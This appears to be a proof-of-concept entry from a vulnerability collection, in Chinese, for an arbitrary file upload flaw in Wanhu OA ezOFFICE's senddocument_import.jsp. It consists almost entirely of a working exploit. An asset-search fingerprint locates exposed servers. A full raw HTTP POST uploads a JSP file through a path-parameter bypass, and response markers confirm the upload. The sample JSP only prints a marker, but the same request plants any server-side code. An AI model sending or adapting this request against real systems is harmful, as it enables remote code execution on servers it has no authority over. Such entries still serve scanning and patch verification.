﻿# 万户OA-senddocument_import.jsp任意文件上传漏洞

> 更新时间：2024-02-06

> 漏洞编号：

> 漏洞说明：

> 漏洞特征：app="万户网络-ezOFFICE"&&body="/defaultroot/"

> 验证脚本：HTTP

```
POST /defaultroot/modules/govoffice/gov_documentmanager/senddocument_import.jsp;?categoryId=null&path=loginpage&mode=add&fileName=null&saveName=null&fileMaxSize=0&fileMaxNum=null&fileType=jsp HTTP/1.1
Accept-Encoding: gzip, deflate
Connection: close
Content-Type: multipart/form-data; boundary=----w80tipyzy4xm9y5cb2zk

------w80tipyzy4xm9y5cb2zk
Content-Disposition: form-data; name="photo"; filename="dudesite.jsp"
Content-Type: application/octet-stream

<%out.println("dudesite");%>
------w80tipyzy4xm9y5cb2zk
Content-Disposition: form-data; name="continueUpload"

0
------w80tipyzy4xm9y5cb2zk
Content-Disposition: form-data; name="submit"

导 入
------w80tipyzy4xm9y5cb2zk--
```

> 响应代码特征：200

> 响应内容特征：dudesite.jsp

> 上传文件定位：


> 验证文件来源：万户OA-senddocument_import.jsp任意文件上传漏洞.poc
